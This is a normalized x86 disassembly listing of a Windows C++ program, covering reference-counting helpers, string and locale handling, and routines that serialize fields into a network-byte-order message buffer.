mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x8
sub_40f240
push 0xffffffff
push sub_4306e9
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40f2a0
mov eax [ ecx + 0x1c ]
push eax
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push 0x0
push ecx
push edx
call sub_42b600
mov ecx eax
call sub_42be40
retn 0x8
sub_40f3c0
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
push edi
mov edi [ esi ]
test edi edi
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
pop edi
je r-xdata
mov ecx edi
call sub_40f010
push edi
call ??3@YAXPAX@Z
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_40f410
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
push edi
mov edi [ esi ]
test edi edi
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
pop edi
je r-xdata
mov ecx edi
call sub_40f240
push edi
call ??3@YAXPAX@Z
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_40f470
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
push edi
mov edi [ esi ]
test edi edi
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
pop edi
je r-xdata
mov ecx edi
call sub_40f010
push edi
call ??3@YAXPAX@Z
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_40f4c0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_43070b
push eax
mov [ fs : 0x0 ] esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
mov [ esi ] eax
je r-xdata
call sub_40f3c0
mov [ esi + 0x4 ] 0x0
push 0x4
call sub_42e3bc
add esp 0x4
mov [ esp + 0x14 ] eax
mov [ esp + 0xc ] 0x0
test eax eax
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ esp + 0x4 ]
mov eax esi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
push eax
call [ InterlockedIncrement@IAT ]
mov eax esi
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
mov [ esp + 0xc ] 0xffffffff
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
sub_40f560
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
push edi
mov edi [ esi ]
test edi edi
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
pop edi
je r-xdata
mov ecx edi
call sub_40f240
push edi
call ??3@YAXPAX@Z
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_40f5b0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_43072b
push eax
mov [ fs : 0x0 ] esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
mov [ esi ] eax
je r-xdata
call sub_40f410
mov [ esi + 0x4 ] 0x0
push 0x4
call sub_42e3bc
add esp 0x4
mov [ esp + 0x14 ] eax
mov [ esp + 0xc ] 0x0
test eax eax
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ esp + 0x4 ]
mov eax esi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
push eax
call [ InterlockedIncrement@IAT ]
mov eax esi
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
mov [ esp + 0xc ] 0xffffffff
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
sub_40f650
sub esp 0x8
push ebx
push ebp
push esi
push edi
push 0x4
lea eax [ esp + 0x14 ]
push eax
mov esi ecx
call sub_4022b0
mov ecx [ esp + 0x1c ]
mov edx [ ecx ]
push edx
call [ htonl@IAT ]
mov ebx [ esi + 0x4 ]
mov edi [ esi ]
mov ecx [ edi + 0x4 ]
mov ebp eax
lea eax [ ebx + 0x1 ]
cmp eax ecx
jbe r-xdata
mov eax [ edi ]
lea ecx [ esp + 0x10 ]
cmp esi ecx
mov [ ebx + eax ] ebp
je r-xdata
push eax
mov ecx edi
call sub_401160
mov eax [ esi + 0x8 ]
pop edi
add eax 0x4
mov [ esi + 0x8 ] eax
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x4
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov [ esi ] edx
mov [ esi + 0x4 ] eax
sub_40f6c0
sub esp 0x8
push ebx
push esi
push edi
push 0x1
lea eax [ esp + 0x10 ]
push eax
mov esi ecx
call sub_4022b0
mov ebx [ esi + 0x4 ]
mov edi [ esi ]
mov ecx [ edi + 0x4 ]
lea eax [ ebx + 0x1 ]
cmp eax ecx
jbe r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ edi ]
mov al [ edx ]
mov [ ebx + ecx ] al
lea ecx [ esp + 0xc ]
cmp esi ecx
je r-xdata
push eax
mov ecx edi
call sub_401160
mov eax [ esi + 0x8 ]
inc eax
pop edi
mov [ esi + 0x8 ] eax
pop esi
pop ebx
add esp 0x8
retn 0x4
mov edx [ esp + 0xc ]
mov eax [ esp + 0x10 ]
mov [ esi ] edx
mov [ esi + 0x4 ] eax
sub_40f720
push 0xffffffff
push sub_43076a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
mov [ esp + 0x8 ] esi
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ esp + 0x14 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esp + 0x14 ] 0x1
push 0x800
lea ecx [ esi + 0x10 ]
call sub_401360
mov [ esp + 0x14 ] 0x2
lea ecx [ esi + 0x2c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x14 ] 0x3
mov [ esi + 0x50 ] bl
mov [ esp + 0x14 ] 0xffffffff
mov ecx [ esp + 0xc ]
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40f7a0
push 0xffffffff
push sub_4307aa
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
push esi
mov esi ecx
push edi
mov [ esp + 0x10 ] esi
mov [ esp + 0x1c ] 0x2
lea ecx [ esi + 0x2c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x1c ] 0x1
lea ecx [ esi + 0x10 ]
call sub_4014a0
xor ebx ebx
mov [ esp + 0x1c ] bl
mov eax [ esi + 0xc ]
cmp eax ebx
mov ebp [ InterlockedDecrement@IAT ]
je r-xdata
mov [ esp + 0x1c ] 0xffffffff
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
push eax
call ebp
test eax eax
jg r-xdata
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push eax
call ebp
test eax eax
jg r-xdata
mov edi [ esi + 0x8 ]
cmp edi ebx
je r-xdata
mov edi [ esi ]
cmp edi ebx
je r-xdata
mov eax [ esi + 0xc ]
cmp eax ebx
je r-xdata
mov ecx edi
call sub_40f240
push edi
call ??3@YAXPAX@Z
add esp 0x4
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
mov ecx edi
call sub_40f010
push edi
call ??3@YAXPAX@Z
add esp 0x4
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_40f880
mov eax [ fs : 0x0 ]
mov edx [ esp + 0x14 ]
push 0xffffffff
push sub_4307d6
push eax
mov eax [ esp + 0x1c ]
mov [ fs : 0x0 ] esp
push esi
mov esi ecx
mov ecx [ esp + 0x1c ]
push edi
mov [ esi + 0x4c ] ecx
push edx
lea ecx [ esi + 0x2c ]
mov [ esi + 0x48 ] eax
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
mov al [ esp + 0x2c ]
push 0x34
mov [ esi + 0x50 ] al
call sub_42e3bc
add esp 0x4
mov [ esp + 0x2c ] eax
mov [ esp + 0x10 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
push ecx
push edx
mov ecx eax
call sub_40f1e0
jmp r-xdata
call sub_40f280
test eax eax
je r-xdata
xor eax eax
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
add esp 0xc
retn 0x18
mov [ esp + 0x10 ] 0xffffffff
lea edi [ esi + 0x8 ]
push eax
mov ecx edi
call sub_40f5b0
mov ecx [ edi ]
test ecx ecx
jne r-xdata
push 0x2c
call sub_42e3bc
add esp 0x4
mov [ esp + 0x2c ] eax
mov [ esp + 0x10 ] 0x1
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_40efb0
jmp r-xdata
mov [ esp + 0x10 ] 0xffffffff
push eax
mov ecx esi
call sub_40f4c0
mov ecx [ esi ]
xor eax eax
test ecx ecx
mov ecx [ esp + 0x8 ]
pop edi
setne al
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x18
sub_40f9a0
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
mov esi ecx
push eax
lea ecx [ esi + 0x8 ]
call sub_40f650
mov edi [ esi + 0x18 ]
mov ebx [ esi + 0x10 ]
mov esi [ esi + 0x14 ]
mov ecx [ esi + 0x4 ]
lea eax [ edi + 0xc ]
cmp eax ecx
jbe r-xdata
mov esi [ esi ]
push ebx
add esi edi
call [ htonl@IAT ]
pop edi
mov [ esi + 0x8 ] eax
pop esi
pop ebx
retn 0x4
push eax
mov ecx esi
call sub_401160
sub_40f9f0
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
mov esi ecx
push eax
lea ecx [ esi + 0x8 ]
call sub_40f6c0
mov edi [ esi + 0x18 ]
mov ebx [ esi + 0x10 ]
mov esi [ esi + 0x14 ]
mov ecx [ esi + 0x4 ]
lea eax [ edi + 0xc ]
cmp eax ecx
jbe r-xdata
mov esi [ esi ]
push ebx
add esi edi
call [ htonl@IAT ]
pop edi
mov [ esi + 0x8 ] eax
pop esi
pop ebx
retn 0x4
push eax
mov ecx esi
call sub_401160
sub_40fa40
push 0xffffffff
push sub_4307f7
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xac
mov eax [ rw-data ]
push ebx
push ebp
mov ebx ecx
mov ecx [ esp + 0xc4 ]
push esi
mov [ esp + 0xb4 ] eax
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
mov esi eax
lea eax [ esp + 0x34 ]
mov [ esp + 0x30 ] eax
call [ rw-data ]
push eax
push esi
lea ecx [ esp + 0x38 ]
call sub_401e50
mov [ esp + 0xc0 ] 0x0
mov ecx [ esp + 0x30 ]
push ecx
lea ecx [ esp + 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0xc0 ] 0x2
mov eax [ esp + 0x30 ]
lea edx [ esp + 0x34 ]
cmp eax edx
je r-xdata
mov ebp [ esp + 0x28 ]
lea eax [ esp + 0xc ]
push eax
mov ecx ebx
mov [ esp + 0x10 ] ebp
call sub_40f650
test ebp ebp
je r-xdata
push eax
call [ free@IAT ]
add esp 0x4
mov [ esp + 0xc0 ] 0xffffffff
lea ecx [ esp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0xb8 ]
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0xac ]
pop ebx
call sub_42e72f
add esp 0xb8
retn 0x4
push edi
push ebp
lea ecx [ esp + 0x14 ]
push ecx
mov ecx ebx
call sub_4022b0
mov esi [ ebx + 0x4 ]
mov edi [ ebx ]
mov ecx [ edi + 0x4 ]
lea eax [ esi + 0x1 ]
cmp eax ecx
jbe r-xdata
mov edi [ edi ]
lea ecx [ esp + 0x18 ]
add edi esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ecx ebp
mov edx ecx
shr ecx 0x2
mov esi eax
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edx [ ebx + 0x8 ]
add edx ebp
lea eax [ esp + 0x10 ]
cmp ebx eax
mov [ ebx + 0x8 ] edx
pop edi
je r-xdata
push eax
mov ecx edi
call sub_401160
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
mov [ ebx ] ecx
mov [ ebx + 0x4 ] edx
sub_40fb90
mov eax [ fs : 0x0 ]
mov cl [ rw-data ]
push 0xffffffff
push sub_43081e
push eax
mov eax 0x1
test al cl
mov [ fs : 0x0 ] esp
jne r-xdata
mov ecx [ esp ]
mov eax rw-data
mov [ fs : 0x0 ] ecx
add esp 0xc
retn
or [ rw-data ] eax
mov [ esp + 0x8 ] 0x0
mov ecx rw-data
call sub_40f720
push sub_433f60
call sub_42e6e6
add esp 0x4
mov [ esp + 0x8 ] 0xffffffff
sub_40fc00
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
mov esi ecx
push eax
lea ecx [ esi + 0x8 ]
call sub_40fa40
mov edi [ esi + 0x18 ]
mov ebx [ esi + 0x10 ]
mov esi [ esi + 0x14 ]
mov ecx [ esi + 0x4 ]
lea eax [ edi + 0xc ]
cmp eax ecx
jbe r-xdata
mov esi [ esi ]
push ebx
add esi edi
call [ htonl@IAT ]
pop edi
mov [ esi + 0x8 ] eax
pop esi
pop ebx
retn 0x4
push eax
mov ecx esi
call sub_401160
sub_40fc50
push 0xffffffff
push sub_430839
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
push ebx
push ebp
mov ebp ecx
push esi
lea esi [ ebp + 0x10 ]
push edi
mov ecx esi
mov [ esp + 0x18 ] ebp
call sub_4014e0
push r--data
lea ecx [ esp + 0x20 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x40 ] 0x0
push eax
lea ecx [ esi + 0x8 ]
call sub_40fa40
mov eax [ esi + 0x10 ]
mov edi [ esi + 0x18 ]
mov ebx [ esi + 0x14 ]
mov ecx [ ebx + 0x4 ]
mov [ esp + 0x10 ] eax
lea eax [ edi + 0xc ]
cmp eax ecx
jbe r-xdata
mov ebx [ ebx ]
mov ecx [ esp + 0x10 ]
add ebx edi
mov edi [ htonl@IAT ]
push ecx
call edi
mov [ ebx + 0x8 ] eax
mov [ esp + 0x40 ] 0xffffffff
lea ecx [ esp + 0x1c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
lea edx [ ebp + 0x2c ]
push edx
lea ecx [ esi + 0x8 ]
call sub_40fa40
mov eax [ esi + 0x10 ]
mov ebx [ esi + 0x14 ]
mov ecx [ ebx + 0x4 ]
mov [ esp + 0x14 ] eax
mov eax [ esi + 0x18 ]
mov [ esp + 0x10 ] eax
add eax 0xc
cmp eax ecx
jbe r-xdata
push eax
mov ecx ebx
call sub_401160
mov ebx [ ebx ]
add ebx [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
push ecx
call edi
lea edx [ ebp + 0x48 ]
push edx
lea ecx [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
call sub_40f650
mov eax [ esi + 0x10 ]
mov ebx [ esi + 0x14 ]
mov ecx [ ebx + 0x4 ]
mov [ esp + 0x10 ] eax
mov eax [ esi + 0x18 ]
mov [ esp + 0x14 ] eax
add eax 0xc
cmp eax ecx
jbe r-xdata
push eax
mov ecx ebx
call sub_401160
mov ebx [ ebx ]
add ebx [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
push ecx
call edi
add ebp 0x4c
push ebp
lea ecx [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
call sub_40f650
mov ebp [ esi + 0x18 ]
mov ebx [ esi + 0x14 ]
mov ecx [ ebx + 0x4 ]
mov edx [ esi + 0x10 ]
lea eax [ ebp + 0xc ]
cmp eax ecx
mov [ esp + 0x14 ] edx
jbe r-xdata
push eax
mov ecx ebx
call sub_401160
mov eax [ esp + 0x14 ]
mov ebx [ ebx ]
push eax
add ebx ebp
call edi
mov ebp [ esp + 0x48 ]
push ebp
lea ecx [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
call sub_40f650
mov ecx [ esi + 0x10 ]
mov eax [ esi + 0x18 ]
mov ebx [ esi + 0x14 ]
mov [ esp + 0x14 ] ecx
mov ecx [ ebx + 0x4 ]
mov [ esp + 0x48 ] eax
add eax 0xc
cmp eax ecx
jbe r-xdata
push eax
mov ecx ebx
call sub_401160
mov edx [ esp + 0x14 ]
mov ebx [ ebx ]
mov ecx [ esp + 0x48 ]
push edx
add ebx ecx
call edi
mov [ ebx + 0x8 ] eax
lea eax [ ebp + 0x4 ]
push eax
lea ecx [ esi + 0x8 ]
call sub_40f650
mov ecx [ esi + 0x10 ]
mov eax [ esi + 0x18 ]
mov ebx [ esi + 0x14 ]
mov [ esp + 0x14 ] ecx
mov ecx [ ebx + 0x4 ]
mov [ esp + 0x48 ] eax
add eax 0xc
cmp eax ecx
jbe r-xdata
push eax
mov ecx ebx
call sub_401160
mov edx [ esp + 0x14 ]
mov ebx [ ebx ]
mov ecx [ esp + 0x48 ]
push edx
add ebx ecx
call edi
mov [ ebx + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x8 ]
call sub_40f650
mov ecx [ esi + 0x10 ]
mov eax [ esi + 0x18 ]
mov ebx [ esi + 0x14 ]
mov [ esp + 0x14 ] ecx
mov ecx [ ebx + 0x4 ]
mov [ esp + 0x48 ] eax
add eax 0xc
cmp eax ecx
jbe r-xdata
push eax
mov ecx ebx
call sub_401160
mov edx [ esp + 0x14 ]
mov ebx [ ebx ]
mov ecx [ esp + 0x48 ]
push edx
add ebx ecx
call edi
lea ecx [ esp + 0x48 ]
mov [ ebx + 0x8 ] eax
mov al [ ebp + 0xc ]
push ecx
lea ecx [ esi + 0x8 ]
mov [ esp + 0x4c ] al
call sub_40f6c0
mov ebp [ esi + 0x18 ]
mov ebx [ esi + 0x14 ]
mov ecx [ ebx + 0x4 ]
mov edx [ esi + 0x10 ]
lea eax [ ebp + 0xc ]
cmp eax ecx
mov [ esp + 0x48 ] edx
jbe r-xdata
push eax
mov ecx ebx
call sub_401160
mov eax [ esp + 0x48 ]
mov ebx [ ebx ]
push eax
add ebx ebp
call edi
mov ecx [ esp + 0x18 ]
add ecx 0x50
push ecx
lea ecx [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
call sub_40f6c0
mov ebx [ esi + 0x18 ]
mov ebp [ esi + 0x10 ]
mov esi [ esi + 0x14 ]
mov ecx [ esi + 0x4 ]
lea eax [ ebx + 0xc ]
cmp eax ecx
jbe r-xdata
push eax
mov ecx ebx
call sub_401160
mov esi [ esi ]
push ebp
add esi ebx
call edi
mov ecx [ esp + 0x38 ]
pop edi
mov [ esi + 0x8 ] eax
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x34
retn 0x4
push eax
mov ecx esi
call sub_401160
sub_40fef0
sub esp 0x10
push esi
mov esi ecx
mov ecx [ esi ]
lea eax [ esp + 0x4 ]
push eax
call sub_40f110
lea ecx [ esp + 0x4 ]
push ecx
mov ecx esi
call sub_40fc50
mov eax [ esi + 0x20 ]
mov edx [ esi + 0x10 ]
mov ecx [ esi + 0x8 ]
add eax 0xc
push eax
push edx
call sub_40f2a0
mov edx [ esi + 0x20 ]
xor ecx ecx
add edx 0xc
cmp eax edx
sete cl
pop esi
mov eax ecx
add esp 0x10
retn
sub_40ff50
push esi
mov esi ecx
mov eax [ esi ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
test eax eax
je r-xdata
pop esi
retn
mov eax [ esi ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
mov ecx eax
pop esi
jmp [ std::basic_streambuf<char,struct std::char_traits<char> >::_Unlock@IAT ]
sub_40ff90
push esi
mov esi ecx
mov eax [ esi ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
test eax eax
je r-xdata
pop esi
retn
mov eax [ esi ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
mov ecx eax
pop esi
jmp [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::_Unlock@IAT ]
sub_40ffc0
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
mov [ esi ] eax
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn 0x4
mov eax [ esi ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<char,struct std::char_traits<char> >::_Lock@IAT ]
sub_410000
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
mov [ esi ] eax
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn 0x4
mov eax [ esi ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::_Lock@IAT ]
sub_410060
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
mov [ esi ] eax
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn 0x4
mov eax [ esi ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<char,struct std::char_traits<char> >::_Lock@IAT ]
sub_4100a0
push esi
mov esi ecx
mov eax [ esi ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
test eax eax
je r-xdata
pop esi
retn
mov eax [ esi ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
mov ecx eax
pop esi
jmp [ std::basic_streambuf<char,struct std::char_traits<char> >::_Unlock@IAT ]
sub_4100d0
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
mov [ esi ] eax
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn 0x4
mov eax [ esi ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::_Lock@IAT ]
sub_410110
push esi
mov esi ecx
mov eax [ esi ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
test eax eax
je r-xdata
pop esi
retn
mov eax [ esi ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
mov ecx eax
pop esi
jmp [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::_Unlock@IAT ]
sub_410140
push 0xffffffff
push sub_430859
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push esi
push 0x0
lea ecx [ esp + 0xc ]
call [ std::_Lockit::_Lockit@IAT ]
mov [ esp + 0x20 ] 0x0
mov eax [ rw-data ]
mov ecx [ std::ctype<char>::id@IAT ]
mov [ esp + 0x4 ] eax
call [ std::locale::id@IAT ]
mov ecx [ esp + 0x28 ]
push eax
call [ std::locale::_Getfacet@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov [ esp + 0x20 ] 0xffffffff
lea ecx [ esp + 0x8 ]
call [ std::_Lockit::~_Lockit@IAT ]
mov ecx [ esp + 0x18 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x20
retn
mov esi [ esp + 0x4 ]
test esi esi
jne r-xdata
lea ecx [ esp + 0x4 ]
push ecx
call [ std::ctype<char>::_Getcat@IAT ]
add esp 0x4
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esp + 0x4 ]
push edi
mov esi ecx
mov [ rw-data ] ecx
mov edi ecx
call [ std::locale::facet::_Incref@IAT ]
mov ecx edi
call [ std::locale::facet::_Register@IAT ]
pop edi
push r--data
lea ecx [ esp + 0x10 ]
call [ bad_cast::bad_cast@IAT ]
push r--data
lea edx [ esp + 0x10 ]
push edx
call _CxxThrowException
sub_410210
push 0xffffffff
push sub_430879
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push esi
push 0x0
lea ecx [ esp + 0xc ]
call [ std::_Lockit::_Lockit@IAT ]
mov [ esp + 0x20 ] 0x0
mov eax [ rw-data ]
mov ecx [ std::ctype<wchar_t>::id@IAT ]
mov [ esp + 0x4 ] eax
call [ std::locale::id@IAT ]
mov ecx [ esp + 0x28 ]
push eax
call [ std::locale::_Getfacet@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov [ esp + 0x20 ] 0xffffffff
lea ecx [ esp + 0x8 ]
call [ std::_Lockit::~_Lockit@IAT ]
mov ecx [ esp + 0x18 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x20
retn
mov esi [ esp + 0x4 ]
test esi esi
jne r-xdata
lea ecx [ esp + 0x4 ]
push ecx
call [ std::ctype<wchar_t>::_Getcat@IAT ]
add esp 0x4
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esp + 0x4 ]
push edi
mov esi ecx
mov [ rw-data ] ecx
mov edi ecx
call [ std::locale::facet::_Incref@IAT ]
mov ecx edi
call [ std::locale::facet::_Register@IAT ]
pop edi
push r--data
lea ecx [ esp + 0x10 ]
call [ bad_cast::bad_cast@IAT ]
push r--data
lea edx [ esp + 0x10 ]
push edx
call _CxxThrowException
sub_4102e0
push 0xffffffff
push sub_4308b3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
mov eax [ esp + 0x34 ]
push esi
push eax
lea ecx [ esp + 0xc ]
mov [ esp + 0x8 ] 0x0
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x2c ] 0x1
mov ecx [ esp + 0x3c ]
push ecx
mov ecx eax
